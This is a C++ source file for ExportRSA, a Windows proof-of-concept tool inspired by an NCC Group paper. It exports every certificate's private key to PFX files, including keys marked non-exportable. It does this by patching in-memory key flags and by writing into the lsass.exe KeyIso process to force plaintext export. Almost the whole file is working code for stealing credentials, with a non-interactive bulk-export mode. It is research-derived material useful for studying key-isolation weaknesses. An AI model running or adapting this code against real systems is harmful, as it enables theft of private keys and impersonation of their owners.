/*
This is free and unencumbered software released into the public domain.
Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.
In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
*/
/*
code inspired from the following paper:
https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/exporting_non-exportable_rsa_keys.pdf

ExportRSA v1.0
by Jason Geffner (jason.geffner@ngssecure.com)
This program enumerates all certificates in all system stores in all system
store locations and creates PFX files in the current directory for each
certificate found that has a local associated RSA private key. Each PFX file
created includes the ceritificate's private key, even if the private key was
marked as non-exportable.
For access to CNG RSA private keys, this program must be run with write-access
to the process that hosts the KeyIso service (the lsass.exe process). Either
modify the ACL on the target process, or run this program in the context of
SYSTEM with a tool such as PsExec.
This code performs little-to-no error-checking, does not free allocated memory,
and does not release handles. It is provided as proof-of-concept code with a
focus on simplicity and readability. As such, the code below in its current
form should not be used in a production environment.
This code was successfully tested on:
Windows 2000 (32-bit)
Windows XP (32-bit)
Windows Server 2003 (32-bit)
Windows Vista (32-bit)
Windows Mobile 6 (32-bit)
Windows Server 2008 (32-bit)
Windows 7 (32-bit, 64-bit)
Release History:
March 18, 2011 - v1.0 - First public release
*/
#include "stdafx.h"

#include <iostream>
#include <string>
#include <set>
#include <fstream>

#include <Windows.h>
#include <WinCrypt.h>
#include <stdio.h>

using namespace std;

#pragma comment(lib, "crypt32.lib")
#ifndef WINCE
#pragma comment(lib, "ncrypt.lib")
#endif

#ifndef CERT_NCRYPT_KEY_SPEC
#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF
#endif

BOOL g_fWow64Process;
BOOL g_fVerbose = FALSE;
BOOL g_fIncludeCng = FALSE;
BOOL g_fIncludeExpired = FALSE;
BOOL g_fNoPassword = FALSE;
BOOL g_fNonInteractive = FALSE;
BOOL g_fPasswordFromFile = FALSE;
wstring g_passwordFilePath;
wstring g_password;   // password used to protect every export (collected once)
set<wstring> g_exportedThumbprints;   // SHA1 thumbprints already exported

// Widen a byte string to a wstring the same way getpass() does (one byte per
// wchar_t), so a password read from a file or stdin matches a typed one.
wstring
WidenBytes(const string& s)
{
    wstring w;
    for (size_t i = 0; i < s.size(); ++i)
    {
        w += (wchar_t)(unsigned char)s[i];
    }
    return w;
}

// Read the password from the first line of a file. Returns false if the file
// cannot be opened.
bool
ReadPasswordFromFile(const wstring& path, wstring& out)
{
    ifstream f(path.c_str(), ios::binary);
    if (!f.is_open())
    {
        return false;
    }
    string line;
    getline(f, line);   // first line, up to the newline
    if (!line.empty() && line[line.size() - 1] == '\r')
    {
        line.resize(line.size() - 1);
    }
    out = WidenBytes(line);
    return true;
}

// Format a FILETIME as "YYYY-MM-DD HH:MM:SS" (UTC).
wstring
FileTimeToString(const FILETIME& ft)
{
    SYSTEMTIME st;
    wchar_t buf[64];
    if (FileTimeToSystemTime(&ft, &st))
    {
        swprintf_s(buf,
                   L"%04d-%02d-%02d %02d:%02d:%02d",
                   st.wYear, st.wMonth, st.wDay,
                   st.wHour, st.wMinute, st.wSecond);
        return wstring(buf);
    }
    return wstring(L"<invalid date>");
}

// Format a FILETIME as just "YYYY-MM-DD" (UTC), safe for use in a file name.
wstring
FileTimeToDateString(const FILETIME& ft)
{
    SYSTEMTIME st;
    wchar_t buf[16];
    if (FileTimeToSystemTime(&ft, &st))
    {
        swprintf_s(buf,
                   L"%04d-%02d-%02d",
                   st.wYear, st.wMonth, st.wDay);
        return wstring(buf);
    }
    return wstring(L"unknown-date");
}

// Retrieve a certificate's simple display name (subject, or issuer when
// CERT_NAME_ISSUER_FLAG is passed).
wstring
GetCertDisplayName(PCCERT_CONTEXT pCtx, DWORD dwFlags)
{
    DWORD cch = CertGetNameStringW(
                pCtx,
                CERT_NAME_SIMPLE_DISPLAY_TYPE,
                dwFlags,
                NULL,
                NULL,
                0);
    if (cch <= 1)
    {
        return wstring(L"");
    }
    wchar_t* buf = (wchar_t*)malloc(cch * sizeof(wchar_t));
    CertGetNameStringW(
                pCtx,
                CERT_NAME_SIMPLE_DISPLAY_TYPE,
                dwFlags,
                NULL,
                buf,
                cch);
    wstring s(buf);
    free(buf);
    return s;
}

// Turn an arbitrary certificate name into something safe to use as a file name.
wstring
SanitizeFileName(const wstring& in)
{
    wstring out;
    for (size_t i = 0; i < in.size(); ++i)
    {
        wchar_t c = in[i];
        if ((c >= L'0' && c <= L'9') ||
            (c >= L'A' && c <= L'Z') ||
            (c >= L'a' && c <= L'z') ||
            c == L'-' || c == L'.')
        {
            out += c;
        }
        else
        {
            // spaces and everything else become a single underscore
            out += L'_';
        }
    }
    // trim leading/trailing separators
    while (!out.empty() &&
           (out[out.size() - 1] == L'_' || out[out.size() - 1] == L'.'))
    {
        out.resize(out.size() - 1);
    }
    size_t start = 0;
    while (start < out.size() && out[start] == L'_')
    {
        start++;
    }
    out = out.substr(start);
    if (out.size() > 80)
    {
        out = out.substr(0, 80);
    }
    if (out.empty())
    {
        out = L"cert";
    }
    return out;
}

// Return the certificate's SHA1 thumbprint as an uppercase hex string, or an
// empty string if it cannot be determined.
wstring
GetCertThumbprint(PCCERT_CONTEXT pCtx)
{
    BYTE rgbHash[64];
    DWORD cbHash = sizeof(rgbHash);
    if (!CertGetCertificateContextProperty(pCtx, CERT_HASH_PROP_ID, rgbHash, &cbHash))
    {
        return wstring(L"");
    }
    wstring hex;
    wchar_t byteHex[3];
    for (DWORD i = 0; i < cbHash; ++i)
    {
        swprintf_s(byteHex, L"%02X", rgbHash[i]);
        hex += byteHex;
    }
    return hex;
}

// Print the certificate name plus, for the whole chain up to the root, each
// certificate's subject, issue date, expiration date and issuing certificate.
void
PrintCertChainInfo(PCCERT_CONTEXT pCertContext)
{
    CERT_CHAIN_PARA chainPara;
    memset(&chainPara, 0, sizeof(chainPara));
    chainPara.cbSize = sizeof(chainPara);

    PCCERT_CHAIN_CONTEXT pChainContext = NULL;
    if (CertGetCertificateChain(
                NULL,
                pCertContext,
                NULL,
                pCertContext->hCertStore,
                &chainPara,
                0,
                NULL,
                &pChainContext)
        && pChainContext->cChain > 0)
    {
        PCERT_SIMPLE_CHAIN pChain = pChainContext->rgpChain[0];
        for (DWORD i = 0; i < pChain->cElement; ++i)
        {
            PCCERT_CONTEXT pElem = pChain->rgpElement[i]->pCertContext;
            wstring subj   = GetCertDisplayName(pElem, 0);
            wstring issuer = GetCertDisplayName(pElem, CERT_NAME_ISSUER_FLAG);
            // A self-signed (root) certificate is its own issuer.
            if (issuer == subj)
            {
                issuer = L"<self>";
            }
            wstring nb     = FileTimeToString(pElem->pCertInfo->NotBefore);
            wstring na     = FileTimeToString(pElem->pCertInfo->NotAfter);
            fprintf(stdout,
                    "    [%u] %S\n"
                    "        Issued : %S\n"
                    "        Expires: %S\n"
                    "        Issuer : %S\n",
                    i, subj.c_str(), nb.c_str(), na.c_str(), issuer.c_str());
        }
        CertFreeCertificateChain(pChainContext);
    }
    else
    {
        // Could not build a chain; report just this certificate.
        wstring subj   = GetCertDisplayName(pCertContext, 0);
        wstring issuer = GetCertDisplayName(pCertContext, CERT_NAME_ISSUER_FLAG);
        if (issuer == subj)
        {
            issuer = L"<self>";
        }
        wstring nb     = FileTimeToString(pCertContext->pCertInfo->NotBefore);
        wstring na     = FileTimeToString(pCertContext->pCertInfo->NotAfter);
        fprintf(stdout,
                "    %S\n"
                "        Issued : %S\n"
                "        Expires: %S\n"
                "        Issuer : %S\n",
                subj.c_str(), nb.c_str(), na.c_str(), issuer.c_str());
    }
}

wstring
getpass(
	const char *prompt,
	bool show_asterisk=true)
{
	const char BACKSPACE=8;
	const char RETURN=13;

	wstring password;
	unsigned char ch=0;

	cout <<prompt << endl;

	DWORD con_mode;
	DWORD dwRead;

	HANDLE hIn=GetStdHandle(STD_INPUT_HANDLE);

	GetConsoleMode( hIn, &con_mode );
	SetConsoleMode( hIn, con_mode & ~(ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT) );

	while( ReadConsoleA( hIn, &ch, 1, &dwRead, NULL) && ch !=RETURN )
	{
		if(ch==BACKSPACE)
		{
			if(password.length()!=0)
			{
				if(show_asterisk)
					cout <<"\b \b";
				password.resize(password.length()-1);
			}
		}
		else
		{
			password+=ch;
			if(show_asterisk)
				cout <<'*';
		}
	}
	cout <<endl;
	// Restore the original console mode so later line-oriented input
	// behaves normally.
	SetConsoleMode( hIn, con_mode );
	return password;
}

// Read a line from the console with normal echo/line editing, independent of
// whatever mode the console was previously left in. Returns the text without
// the trailing CR/LF. Used for interactive Y/n prompts.
string
ReadConsoleLine()
{
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
	DWORD oldMode = 0;
	BOOL haveMode = GetConsoleMode(hIn, &oldMode);
	if (haveMode)
	{
		// Force cooked mode so Enter terminates the read and typing echoes.
		SetConsoleMode(hIn,
			oldMode | ENABLE_PROCESSED_INPUT | ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT);
	}

	string line;
	char ch = 0;
	DWORD dwRead = 0;
	while (ReadConsoleA(hIn, &ch, 1, &dwRead, NULL) && dwRead == 1)
	{
		if (ch == '\n')
		{
			break;
		}
		if (ch != '\r')
		{
			line += ch;
		}
	}

	if (haveMode)
	{
		SetConsoleMode(hIn, oldMode);
	}
	return line;
}

BOOL WINAPI
CertEnumSystemStoreCallback(
        const void* pvSystemStore,
        DWORD dwFlags,
        PCERT_SYSTEM_STORE_INFO pStoreInfo,
        void* pvReserved,
        void* pvArg)
{
    // Open a given certificate store
    HCERTSTORE hCertStore = CertOpenStore(
                CERT_STORE_PROV_SYSTEM,
                0,
                NULL,
                dwFlags | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
                pvSystemStore);
    if (NULL == hCertStore)
    {
        //fprintf(stderr, "Cannot open cert store. Skip it: %X\n", GetLastError());
        return TRUE;
    }

    // Enumerate all certificates in the given store
    LPTSTR dwCertName = NULL;
    DWORD cbSize;

    for (PCCERT_CONTEXT pCertContext = CertEnumCertificatesInStore(hCertStore, NULL);
         NULL != pCertContext;
         pCertContext = CertEnumCertificatesInStore(hCertStore, pCertContext))
    {
        if (dwCertName)
        {
            free(dwCertName);
        }

        if(!(cbSize = CertGetNameString(
            pCertContext,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            NULL,
            0)))
        {
           fprintf(stderr, "CertGetName size failed.");
        }
        dwCertName = (LPTSTR)malloc(cbSize * sizeof(TCHAR));

        if(!CertGetNameString(
            pCertContext,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            dwCertName,
            cbSize))
        {
            fprintf(stderr, "CertGetName failed.");
        }

        // Ensure that the certificate's public key is RSA
        if (strncmp(pCertContext->pCertInfo->SubjectPublicKeyInfo.Algorithm.pszObjId,
                    szOID_RSA,
                    strlen(szOID_RSA)))
        {
            if (g_fVerbose)
            {
                fprintf(stderr, "Skip cert with NO rsa public key for %S\n", dwCertName);
            }
            continue;
        }

        // Ensure that the certificate's private key is available
        DWORD dwKeySpec;
        DWORD dwKeySpecSize = sizeof(dwKeySpec);
        if (!CertGetCertificateContextProperty(
                    pCertContext,
                    CERT_KEY_SPEC_PROP_ID,
                    &dwKeySpec,
                    &dwKeySpecSize))
        {
            if (g_fVerbose)
            {
                fprintf(stderr, "Skip cert with NO private key for %S: %x\n", dwCertName, GetLastError());
            }
            continue;
        }

        // Retrieve a handle to the certificate's private key's CSP key
        // container
        HCRYPTPROV hProv;
        HCRYPTPROV hProvTemp;
#ifdef WINCE
        HCRYPTPROV hCryptProvOrNCryptKey;
#else
        HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hCryptProvOrNCryptKey;
        NCRYPT_KEY_HANDLE hNKey;
#endif
        BOOL fCallerFreeProvOrNCryptKey;
        if (!CryptAcquireCertificatePrivateKey(
                    pCertContext,
                #ifdef WINCE
                    0,
                #else
                    CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG,
                #endif
                    NULL,
                    &hCryptProvOrNCryptKey,
                    &dwKeySpec,
                    &fCallerFreeProvOrNCryptKey))
        {
            if (g_fVerbose)
            {
                fprintf(stderr, "Skip cert with NO private key handler for %S: %x\n", dwCertName, GetLastError());
            }
            continue;
        }

        // Skip CNG keys unless the caller explicitly opted in with --include-cng
        if (CERT_NCRYPT_KEY_SPEC == dwKeySpec && !g_fIncludeCng)
        {
            fprintf(stdout, "Not exporting CNG key for \"%S\" (pass --include-cng to include it)\n\n", dwCertName);
            continue;
        }

        // Skip expired certificates unless --include-expired was passed.
        if (CertVerifyTimeValidity(NULL, pCertContext->pCertInfo) > 0 && !g_fIncludeExpired)
        {
            fprintf(stdout, "Not exporting EXPIRED cert \"%S\" (pass --include-expired to include it)\n\n", dwCertName);
            continue;
        }

        // The same certificate can live in more than one store (e.g. user and
        // machine). Skip any we've already exported this run.
        wstring thumbprint = GetCertThumbprint(pCertContext);
        if (!thumbprint.empty() && g_exportedThumbprints.count(thumbprint) != 0)
        {
            fprintf(stdout, "Skipping duplicate of \"%S\" (already exported, thumbprint %S)\n\n", dwCertName, thumbprint.c_str());
            continue;
        }

        // List the certificate, including issue/expiration dates and the
        // issuing certificate for the whole chain, then ask whether to export
        // it (default Yes: just press Enter to accept).
        fprintf(stdout, "Certificate to export: \"%S\"\n", dwCertName);
        PrintCertChainInfo(pCertContext);

        // Ask whether to export, unless running non-interactively.
        if (!g_fNonInteractive)
        {
            fprintf(stdout, "Export this certificate? [Y|n] (default Y) >>>> ");
            fflush(stdout);
            string answer = ReadConsoleLine();
            size_t nonBlank = answer.find_first_not_of(" \t\r\n");
            if (nonBlank != string::npos &&
                (answer[nonBlank] == 'n' || answer[nonBlank] == 'N'))
            {
                fprintf(stdout, "Cert \"%S\" will be NOT exported\n\n", dwCertName);
                continue;
            }
        }

        // do the job
        hProv = hCryptProvOrNCryptKey;
#ifndef WINCE
        hNKey = hCryptProvOrNCryptKey;
#endif
        HCRYPTKEY hKey;
        BYTE* pbData = NULL;
        DWORD cbData = 0;
        if (CERT_NCRYPT_KEY_SPEC != dwKeySpec)
        {
            // This code path is for CryptoAPI
            //fprintf(stdout, "Key for %S use CryptoAPI\n", dwCertName);

            // Retrieve a handle to the certificate's private key
            if (!CryptGetUserKey(
                        hProv,
                        dwKeySpec,
                        &hKey))
            {
                if (g_fVerbose)
                {
                    fprintf(stderr, "Cannot retrieve handle to the private key for %S\n", dwCertName);
                }
                continue;
            }

            // check if private key is exportable
            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      NULL,
                      &cbData))
            {
                if (g_fVerbose)
                {
                    fprintf(stderr, "Private key for cert \"%S\" is not exportable, forcing export: %x\n", dwCertName, GetLastError() );
                }

                // Mark the certificate's private key as exportable and archivable
                *(ULONG_PTR*)(*(ULONG_PTR*)(*(ULONG_PTR*)
                    #if defined(_M_X64)
                        (hKey + 0x58) ^ 0xE35A172CD96214A0) + 0x0C)
                    #elif (defined(_M_IX86) || defined(_ARM_))
                        (hKey + 0x2C) ^ 0xE35A172C) + 0x08)
                    #else
                        #error Platform not supported
                    #endif
                        |= CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE;

                // Export the private key
                // first to retieve the lenght, then to retrieve data
                if (!CryptExportKey(
                          hKey,
                          NULL,
                          PRIVATEKEYBLOB,
                          0,
                          NULL,
                          &cbData))
                {
                    fprintf(stderr, "Not able to get private key lenght for cert \"%S\": %x\n", dwCertName, GetLastError() );
                    continue;
                }
            }
            pbData = (BYTE*)malloc(cbData);

            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      pbData,
                      &cbData))
            {
                fprintf(stderr, "Cannot export private key for for \"%S\": %x\n", dwCertName, GetLastError() );
                continue;
            }

            fprintf(stdout, "\nSUCCESSFULLY get private key for \"%S\"\n", dwCertName );

            // Establish a temporary key container
            if (!CryptAcquireContext(
                        &hProvTemp,
                        NULL,
                        NULL,
                        PROV_RSA_FULL,
                        CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
            {
                fprintf(stderr, "Cannot create temporary key container to store key for %S: %x\n", dwCertName, GetLastError() );
                continue;
            }
            // Import the private key into the temporary key container
            HCRYPTKEY hKeyNew;
            if (!CryptImportKey(
                        hProvTemp,
                        pbData,
                        cbData,
                        0,
                        CRYPT_EXPORTABLE,
                        &hKeyNew))
            {
                fprintf(stderr, "Cannot import key in temporary key container to store key for \"%S\": %x\n", dwCertName, GetLastError() );
                continue;
            }
        }
#ifndef WINCE
        else
        {
            fprintf(stdout, "Key for \"%S\" is a CNG key\n", dwCertName);

            // This code path is for CNG
            // Retrieve a handle to the Service Control Manager
            SC_HANDLE hSCManager = OpenSCManager(
                        NULL,
                        NULL,
                        SC_MANAGER_CONNECT);
            // Retrieve a handle to the KeyIso service
            SC_HANDLE hService = OpenService(
                        hSCManager,
                        L"KeyIso",
                        SERVICE_QUERY_STATUS);
            // Retrieve the status of the KeyIso process, including its Process
            // ID
            SERVICE_STATUS_PROCESS ssp;
            DWORD dwBytesNeeded;
            QueryServiceStatusEx(
                        hService,
                        SC_STATUS_PROCESS_INFO,
                        (BYTE*)&ssp,
                        sizeof(SERVICE_STATUS_PROCESS),
                        &dwBytesNeeded);
            // Open a read-write handle to the process hosting the KeyIso
            // service
            HANDLE hProcess = OpenProcess(
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE,
                        ssp.dwProcessId);
            // Prepare the structure offsets for accessing the appropriate
            // field
            DWORD dwOffsetNKey;
            DWORD dwOffsetSrvKeyInLsass;
            DWORD dwOffsetKspKeyInLsass;
        #if defined(_M_X64)
            dwOffsetNKey = 0x10;
            dwOffsetSrvKeyInLsass = 0x28;
            dwOffsetKspKeyInLsass = 0x28;
        #elif defined(_M_IX86)
            dwOffsetNKey = 0x08;
            if (!g_fWow64Process)
            {
                dwOffsetSrvKeyInLsass = 0x18;
                dwOffsetKspKeyInLsass = 0x20;
            }
            else
            {
                dwOffsetSrvKeyInLsass = 0x28;
                dwOffsetKspKeyInLsass = 0x28;
            }
        #else
            // Platform not supported
            continue;
        #endif
            // Mark the certificate's private key as exportable
            DWORD pKspKeyInLsass;
            SIZE_T sizeBytes;
            ReadProcessMemory(
                        hProcess,
                        (void*)(*(SIZE_T*)*(DWORD*)(hNKey + dwOffsetNKey) +
                                dwOffsetSrvKeyInLsass),
                        &pKspKeyInLsass,
                        sizeof(DWORD),
                        &sizeBytes);
            unsigned char ucExportable;
            ReadProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            ucExportable |= NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
            WriteProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            // Export the private key
            SECURITY_STATUS ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        NULL,
                        0,
                        &cbData,
                        0);
            pbData = (BYTE*)malloc(cbData);
            ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        pbData,
                        cbData,
                        &cbData,
                        0);
            // Establish a temporary CNG key store provider
            NCRYPT_PROV_HANDLE hProvider;
            NCryptOpenStorageProvider(
                        &hProvider,
                        MS_KEY_STORAGE_PROVIDER,
                        0);
            // Import the private key into the temporary storage provider
            NCRYPT_KEY_HANDLE hKeyNew;
            NCryptImportKey(
                        hProvider,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        &hKeyNew,
                        pbData,
                        cbData,
                        0);
        }
#endif

        // Use the password collected once at startup (empty when --no-password).

        // Create a temporary certificate store in memory
        HCERTSTORE hMemoryStore = CertOpenStore(
                    CERT_STORE_PROV_MEMORY,
                    PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
                    NULL,
                    0,
                    NULL);

        // Add a link to the certificate to our tempoary certificate store
        PCCERT_CONTEXT pCertContextNew = NULL;
        CertAddCertificateLinkToStore(
                    hMemoryStore,
                    pCertContext,
                    CERT_STORE_ADD_NEW,
                    &pCertContextNew);

        // Set the key container for the linked certificate to be our temporary
        // key container
        CertSetCertificateContextProperty(
                    pCertContext,
            #ifdef WINCE
                    CERT_KEY_PROV_HANDLE_PROP_ID,
            #else
                    CERT_HCRYPTPROV_OR_NCRYPT_KEY_HANDLE_PROP_ID,
            #endif
                    0,
            #ifdef WINCE
                    (void*)hProvTemp);
            #else
                    (void*)((CERT_NCRYPT_KEY_SPEC == dwKeySpec) ?
                                hNKey : hProvTemp));
            #endif

        // Export the temporary certificate store to a PFX data blob in memory
        CRYPT_DATA_BLOB cdb;
        cdb.cbData = 0;
        cdb.pbData = NULL;
        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    g_password.c_str(),
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
                    | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);
        cdb.pbData = (BYTE*)malloc(cdb.cbData);

        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    g_password.c_str(),
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
                    | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);

        // Prepare the PFX's file name from the issuer's name, the certificate's
        // name and the certificate's issue date, made safe for use as a file name.
        wstring issuerName  = GetCertDisplayName(pCertContext, CERT_NAME_ISSUER_FLAG);
        wstring subjectName = GetCertDisplayName(pCertContext, 0);
        wstring issueDate   = FileTimeToDateString(pCertContext->pCertInfo->NotBefore);
        wstring baseName    = issueDate + L"_" +
                              SanitizeFileName(issuerName) + L"_" +
                              SanitizeFileName(subjectName);

        // Avoid clobbering an existing file (e.g. duplicate issuer/subject/date
        // triples). Probe per-name so the suffixes for a given name run 1, 2, 3,
        // ... with no gaps, independent of other certificates' file names.
        wchar_t wszFileName[MAX_PATH];
        swprintf_s(wszFileName, L"%s.pfx", baseName.c_str());
        for (unsigned long dup = 1;
             INVALID_FILE_ATTRIBUTES != GetFileAttributesW(wszFileName);
             ++dup)
        {
            swprintf_s(wszFileName, L"%s_%lu.pfx", baseName.c_str(), dup);
        }

        // Write the PFX data blob to disk
        HANDLE hFile = CreateFile(
                    wszFileName,
                    GENERIC_WRITE,
                    0,
                    NULL,
                    CREATE_ALWAYS,
                    0,
                    NULL);
        DWORD dwBytesWritten;

        WriteFile(  hFile,
                    cdb.pbData,
                    cdb.cbData,
                    &dwBytesWritten,
                    NULL);
        CloseHandle(hFile);

        // Remember this cert so we don't export it again from another store.
        if (!thumbprint.empty())
        {
            g_exportedThumbprints.insert(thumbprint);
        }

		fprintf(stdout, "SUCCESSFULLY exported cert bundle for \"%S\"in file \"%S\" \n\n", dwCertName, wszFileName );
    }
    return TRUE;
}

BOOL WINAPI
CertEnumSystemStoreLocationCallback(
        LPCWSTR pvszStoreLocations,
        DWORD dwFlags,
        void* pvReserved,
        void* pvArg)
{
    // Enumerate all system stores in a given system store location
    CertEnumSystemStore(
                dwFlags,
                NULL,
                NULL,
                CertEnumSystemStoreCallback);

    return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
    // Parse command-line switches
    for (int i = 1; i < argc; ++i)
    {
        if (0 == _wcsicmp(argv[i], L"-verbose") ||
            0 == _wcsicmp(argv[i], L"--verbose"))
        {
            g_fVerbose = TRUE;
        }
        else if (0 == _wcsicmp(argv[i], L"--include-cng"))
        {
            g_fIncludeCng = TRUE;
        }
        else if (0 == _wcsicmp(argv[i], L"--include-expired"))
        {
            g_fIncludeExpired = TRUE;
        }
        else if (0 == _wcsicmp(argv[i], L"--no-password"))
        {
            g_fNoPassword = TRUE;
        }
        else if (0 == _wcsnicmp(argv[i], L"--password-file=", 16))
        {
            g_fPasswordFromFile = TRUE;
            g_passwordFilePath = argv[i] + 16;
        }
        else if (0 == _wcsicmp(argv[i], L"--password-file"))
        {
            if (i + 1 < argc)
            {
                g_fPasswordFromFile = TRUE;
                g_passwordFilePath = argv[++i];
            }
            else
            {
                fprintf(stderr, "--password-file requires a path argument\n");
                return 1;
            }
        }
        else if (0 == _wcsicmp(argv[i], L"--non-interactive"))
        {
            g_fNonInteractive = TRUE;
        }
        else if (0 == _wcsicmp(argv[i], L"-h") ||
                 0 == _wcsicmp(argv[i], L"--help") ||
                 0 == _wcsicmp(argv[i], L"/?"))
        {
            fprintf(stdout,
                    "Usage: exportrsa.exe [-verbose] [--include-cng] [--include-expired]\n"
                    "                     [--no-password] [--password-file <path>] [--non-interactive]\n"
                    "  -verbose             Print diagnostics about skipped certificates.\n"
                    "  --include-cng        Also export CNG (KeyIso) private keys.\n"
                    "  --include-expired    Also export certificates that have expired.\n"
                    "  --no-password        Do not use a password; export with an empty one.\n"
                    "  --password-file <p>  Read the export password from the first line of file <p>.\n"
                    "  --non-interactive    Export everything without prompting. Reads the password\n"
                    "                       from stdin unless --no-password or --password-file is given.\n");
            return 0;
        }
        else
        {
            fprintf(stderr, "Unknown argument: %S\n", argv[i]);
        }
    }

    // Determine the export password once, up front. Precedence:
    //   --password-file  > --no-password > --non-interactive (stdin) > prompt
    if (g_fPasswordFromFile)
    {
        if (!ReadPasswordFromFile(g_passwordFilePath, g_password))
        {
            fprintf(stderr, "Cannot open password file \"%S\", aborting.\n", g_passwordFilePath.c_str());
            return 1;
        }
    }
    else if (g_fNoPassword)
    {
        g_password = L"";
    }
    else if (g_fNonInteractive)
    {
        // Read the password from the first line of stdin (allows piping it in).
        string line;
        getline(cin, line);
        if (!line.empty() && line[line.size() - 1] == '\r')
        {
            line.resize(line.size() - 1);
        }
        g_password = WidenBytes(line);
    }
    else
    {
        g_password = getpass("Enter password to protect exported certs: ", true);
        wstring passwordCheck = getpass("Enter password again: ", true);
        if (g_password != passwordCheck)
        {
            fprintf(stderr, "Password mismatch, aborting.\n");
            return 1;
        }
        // Separate the password prompts from the certificate output below.
        fprintf(stdout, "\n");
    }

    // Determine if we're a 32-bit process running on a 64-bit OS
    g_fWow64Process = FALSE;
    BOOL (WINAPI* IsWow64Process)(HANDLE, PBOOL) =
            (BOOL (WINAPI*)(HANDLE, PBOOL))GetProcAddress(
                GetModuleHandle(L"kernel32.dll"), "IsWow64Process");
    if (NULL != IsWow64Process)
    {
        IsWow64Process( GetCurrentProcess(),
                        &g_fWow64Process);
    }
    // Scan all system store locations
    CertEnumSystemStoreLocation(
                0,
                NULL,
                CertEnumSystemStoreLocationCallback);

    return 0;
}
